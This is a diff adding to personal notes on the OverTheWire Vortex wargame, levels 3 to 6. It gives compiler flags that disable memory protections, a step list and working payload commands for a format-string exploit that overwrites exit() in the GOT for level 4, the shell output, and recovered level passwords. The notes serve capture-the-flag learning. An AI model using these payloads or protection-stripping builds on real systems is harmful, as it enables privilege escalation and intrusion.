@@ -66,6 +66,9 @@ https://github.com/antoinet/vortex/tree/master/vortex03
 Test locally:
 # echo 0 > /proc/sys/kernel/randomize_va_space
 # gcc -fno-stack-protector -U_FORTIFY_SOURCE vortex3.c -o vortex3
+# gcc file.c -D_FORTIFY_SOURCE=0 -fno-pie -Wno-format -Wno-format-security -fno-stack-protector -z norelro -z execstack -o out
+
+
 
 # objdump -s -j .dtors a.out 
 
@@ -88,3 +91,67 @@ Username: vortex4 Password: 2YmgK1=jw
 
 Level 4:
 ------------------------------------------------
+https://github.com/antoinet/vortex/blob/master/vortex04/
+http://axtaxt.wordpress.com/2010/11/24/overthewire-vortex-level4/
+http://www.overthewire.org/wargames/vortex/readingmaterial/teso_format.txt
+
+- bypass first check
+- get addr of environment variables
+- use format string exploit to set a jump-to address on the stack
+-- get address of exit() in .plt (readelf -r vortex4)
+-- read this address with format strings
+-- read environment variables
+-- write there the address of the shellcode passed in environment variable
+
+vortex4@melissa:/tmp$ readelf -r /vortex/vortex4 
+Relocation section '.rel.plt' at offset 0x294 contains 4 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+0804a00c  00000407 R_386_JUMP_SLOT   00000000   exit
+
+vortex4@melissa:/tmp$ ./v4_wrapper `printf "\x0c\xa0\x04\x08\x0d\xa0\x04\x08\x0e\xa0\x04\x08\x0f\xa0\x04\x08"`A%108\$x%5\$0206d%109\$x%5\$032d%110\$x%111\$x
+
+���A804a00c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000804a00d00000000000000000000000000000000804a00e804a00fvortex4@melissa:/tmp$ 
+
+vortex4@melissa:/tmp$ ./myl4 `printf "\x0c\xa0\x04\x08\x0d\xa0\x04\x08\x0e\xa0\x04\x08\x0f\xa0\x04\x08"`A%108\$n%5\$0206d%109\$n%5\$032d%110\$n%111\$n
+$ 
+
+vortex4@melissa:/tmp$ ./myl4 `printf "\x0c\xa0\x04\x08\x0d\xa0\x04\x08\x0e\xa0\x04\x08\x0f\xa0\x04\x08"`A%108\$x%5\$0206d%109\$x%5\$032d%110\$x%111\$x
+
+���A804a00c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000804a00d00000000000000000000000000000000804a00e804a00fvortex4@melissa:/tmp$
+
+After brute force:
+202 33 fmt: 
+���....%106$n%5$0202d%107$n%5$033d%108$n%109$n: 
+$ id
+uid=5004(vortex4) gid=5004(vortex4) euid=5005(vortex5) groups=5005(vortex5),5004(vortex4)
+$ cat /etc/vortex_pass/vortex5
+:4VtbC4lr
+$
+
+203 32 fmt: 
+���....%106$n%5$0203d%107$n%5$032d%108$n%109$n:
+$
+
+Username: vortex5 Password: :4VtbC4lr
+
+Level 5:
+------------------------------------------------
+MD5 hash: 155fb95d04287b757c996d77b5ea51f7
+Plain: rlTf6
+
+http://www.md5this.com/
+
+vortex5@melissa:/vortex$ ./vortex5 
+Password: 
+6:36
+You got the right password, congrats!
+$ cat /etc/vortex_pass/vortex6
+*uy5qDRb2
+$
+
+Username: vortex6 Password: *uy5qDRb2
+
+Level 6:
+------------------------------------------------
+
+Username: vortex7 Password: 
